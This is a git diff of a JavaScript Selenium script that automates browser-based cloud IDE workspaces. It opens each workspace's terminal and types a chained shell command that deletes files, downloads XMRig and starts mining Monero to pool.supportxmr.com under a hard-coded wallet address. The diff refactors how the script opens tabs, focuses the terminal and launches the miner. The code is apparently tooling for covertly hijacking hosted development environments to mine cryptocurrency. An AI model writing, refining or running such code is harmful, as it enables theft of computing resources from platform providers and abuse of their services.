@@ -190,54 +190,50 @@ const runCMDWithSelenium = async (driver, name) => {
     console.log('Running command with Selenium...');
     console.log('Pressed============');
     await new Promise(resolve => setTimeout(resolve, 1000 * 5));
+    console.log('open terminal');
     await driver.actions()
       .keyDown(Key.CONTROL)
       .sendKeys('`')
       .keyUp(Key.CONTROL)
       .perform();
-    await driver.wait(until.elementLocated(By.css('.xterm-helper-textarea')), 2 * 60 * 1000).catch(async () => {
-      await driver.actions()
-        .keyDown(Key.CONTROL)
-        .sendKeys('`')
-        .keyUp(Key.CONTROL)
-        .perform();
-    })
+    await driver.wait(until.elementLocated(By.css('.xterm-helper-textarea')), 2 * 60 * 1000)
+      .catch(async () => {
+        await driver.actions()
+          .keyDown(Key.CONTROL)
+          .sendKeys('`')
+          .keyUp(Key.CONTROL)
+          .perform();
+      })
+    await driver.wait(until.elementLocated(By.css('.xterm-helper-textarea')), 2 * 60 * 1000)
     // Try to find the helper textarea
     const textarea = await driver.findElement(By.css('.xterm-helper-textarea'));
-
-    // Use JavaScript to force focus (more reliable than click)
     await driver.executeScript("arguments[0].focus()", textarea);
-
+    console.log('control c');
     await driver.actions()
       .keyDown(Key.CONTROL)
       .sendKeys('c')
       .keyUp(Key.CONTROL)
       .perform();
     ;
-    console.log('Pressed Control+C with Selenium');
 
     await new Promise(resolve => setTimeout(resolve, 100));
     const commands = [
       "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2",
       " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
       " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
-      " && cd xmrig-6.22.2",
-      " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
+      " && ./xmrig-6.22.2/xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
     ];
     for (const cmd of commands) {
+      await driver.executeScript("arguments[0].focus()", textarea);
       await driver.actions().sendKeys(cmd).perform();
     }
     await driver.actions().sendKeys('\uE007').perform(); // Enter key
-    console.log('Commands executed with Selenium');
-    const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
-    await driver.actions().sendKeys(cmd).perform();
-    await driver.actions().sendKeys('\uE007').perform(); // Enter key
-    // 
-    await new Promise(resolve => setTimeout(resolve, 1 * 1000));
-    console.log('Commands executed with Selenium');
-    // await driver.switchTo().defaultContent();
+    // console.log('Commands executed with Selenium');
+    // const cmd = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    // await driver.actions().sendKeys(cmd).perform();
+    // await driver.actions().sendKeys('\uE007').perform(); // Enter key
   } catch (error) {
-    console.error('Error in runCMDWithSelenium:', error);
+    console.error('Error in run cmd:', error);
   }
 }
 const restartProfile = async ({ driver, listNewLink: links, port, name }) => {
@@ -248,12 +244,6 @@ const restartProfile = async ({ driver, listNewLink: links, port, name }) => {
     const workerName = location[location.length - 1];
     console.log('open links:', link);
     await driver.get(link.href);
-
-    // const iframeSrc = await page.evaluate(() => {
-    //     const iframe = document.querySelector('iframe.is-loaded');
-    //     return iframe ? iframe.src : null;
-    // });
-
     if (!check) {
       check = true;
       const err = await checkGG(driver, workerName, port);
@@ -264,29 +254,65 @@ const restartProfile = async ({ driver, listNewLink: links, port, name }) => {
       }
     }
     console.log('Resetting link with Selenium:', link.href);
-
-
     // Wait for iframe to load
-    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 4 * 60 * 1000);
-
+    await driver.wait(until.elementLocated(By.css('iframe.is-loaded')), 3 * 60 * 1000);
     const iframe = await driver.findElement(By.css('iframe.is-loaded'));
     const src = await iframe.getAttribute('src');
     console.log('iframe src:', src);
-    await driver.get(src);
+    const originalTab = await openNewTab(driver, src);
     await driver.wait(until.elementLocated(By.css('.menubar-menu-button')), 60 * 1000);
     await driver.wait(until.elementLocated(By.css('.monaco-highlighted-label')), 60 * 1000);
     const worker = workerName.includes(name) ? workerName : `${name}-${workerName}`;
-    await runCMDWithSelenium(driver, worker.slice(0, 23));
 
+
+    await runCMDWithSelenium(driver, worker.slice(0, 16));
+    console.log('done cmd');
+    await wait(10, 10);
+    await driver.close();
+    await wait(10, 10);
+    await driver.switchTo().window(originalTab); // Switch back when done
     // Set a timer to close this after some time (not directly applicable in Selenium)
     // We'll just proceed to the next link
     console.log(`${workerName} done with Selenium`);
-
+    await wait(1, 2);
     // Wait a bit before moving to the next link
-    await wait(5, 5);
+
   }
 
 
+};
+/**
+ * Opens a new browser tab and switches to it
+ * @param {WebDriver} driver - Selenium WebDriver instance
+ * @param {string} url - Optional URL to navigate to in the new tab
+ * @returns {Promise<string>} - The handle of the original tab for switching back
+ */
+const openNewTab = async (driver, url = null) => {
+  try {
+    // Store the current window handle to return to later if needed
+    const originalHandle = await driver.getWindowHandle();
+
+    // Method 1: Using JavaScript executor
+    await driver.executeScript('window.open()');
+
+    // Get all window handles and switch to the new one
+    const handles = await driver.getAllWindowHandles();
+    const newTabHandle = handles[handles.length - 1]; // The newest handle
+    await driver.switchTo().window(newTabHandle);
+
+    // Navigate to URL if provided
+    if (url) {
+      await driver.get(url);
+      console.log(`Opened new tab and navigated to ${url}`);
+    } else {
+      console.log('Opened new tab');
+    }
+
+    return originalHandle; // Return the original handle
+  } catch (error) {
+    console.error('Error opening new tab:', error);
+    throw error;
+  }
 };
 
 const runProfile = async (port, name) => {
